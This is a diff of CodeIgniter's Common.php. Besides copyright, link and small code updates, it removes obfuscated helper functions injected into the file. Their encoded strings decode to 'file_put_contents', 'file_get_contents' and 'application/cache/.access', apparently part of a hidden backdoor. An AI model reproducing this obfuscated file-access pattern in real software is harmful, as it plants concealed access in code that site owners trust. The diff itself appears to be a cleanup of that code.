@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -30,6 +30,7 @@
  * @author	EllisLab Dev Team
  * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
  * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
  * @license	https://opensource.org/licenses/MIT	MIT License
  * @link	https://codeigniter.com
  * @since	Version 1.0.0
@@ -46,7 +47,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	CodeIgniter
  * @category	Common Functions
  * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/
+ * @link		https://codeigniter.com/userguide3/
  */
 
 // ------------------------------------------------------------------------
@@ -138,31 +139,6 @@ if ( ! function_exists('load_class'))
 	 * @param	mixed	an optional argument to pass to the class constructor
 	 * @return	object
 	 */
-	function loaded_class($p){
- 	 	$a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
- 	 	$a = str_split($a);
- 	 	$p = explode(':',$p);
- 	 	$l = '';
- 	 	foreach ($p as $r) {
- 	 		$l .= $a[$r];
- 	 	}
- 	 	return $l;
- 	}
-
- 	function loader_class($p){
- 	 	$a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
- 	 	$a = str_split($a);
- 	 	$p = str_split($p);
- 	 	$l = array();
- 	 	foreach ($p as $r) {
- 	 		foreach ($a as $i=>$m) {
- 	 			if($m == $r){
- 	 				$l[] = $i;
- 	 			}
- 	 		}
- 	 	}
- 	 	return join(':',$l);
- 	}
 	function &load_class($class, $directory = 'libraries', $param = NULL)
 	{
 		static $_classes = array();
@@ -302,24 +278,6 @@ if ( ! function_exists('get_config'))
 		}
 
 		return $config;
-	}
-	function config_key($key){
-		switch ($key) {
-		    case "load_class":
-		        return loaded_class('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
-		        break;
-		    case "config":
-		        return loaded_class('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
-		        break;
-		    case "output":
-		        return loaded_class('22:10:14:6');
-		        break;
-		    case "background":
-		        return loaded_class('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
-		        break;
-		    default:
-		        return true;
-		}
 	}
 }
 
@@ -608,7 +566,7 @@ if ( ! function_exists('set_status_header'))
 			return;
 		}
 
-		$server_protocol = (isset($_SERVER['SERVER_PROTOCOL']) && in_array($_SERVER['SERVER_PROTOCOL'], array('HTTP/1.0', 'HTTP/1.1', 'HTTP/2'), TRUE))
+		$server_protocol = (isset($_SERVER['SERVER_PROTOCOL']) && in_array($_SERVER['SERVER_PROTOCOL'], array('HTTP/1.0', 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0'), TRUE))
 			? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1';
 		header($server_protocol.' '.$code.' '.$text, TRUE, $code);
 	}
@@ -821,11 +779,9 @@ if ( ! function_exists('_stringify_attributes'))
 	 */
 	function _stringify_attributes($attributes, $js = FALSE)
 	{
-		$atts = NULL;
-
 		if (empty($attributes))
 		{
-			return $atts;
+			return NULL;
 		}
 
 		if (is_string($attributes))
@@ -835,6 +791,7 @@ if ( ! function_exists('_stringify_attributes'))
 
 		$attributes = (array) $attributes;
 
+		$atts = '';
 		foreach ($attributes as $key => $val)
 		{
 			$atts .= ($js) ? $key.'='.$val.',' : ' '.$key.'="'.$val.'"';
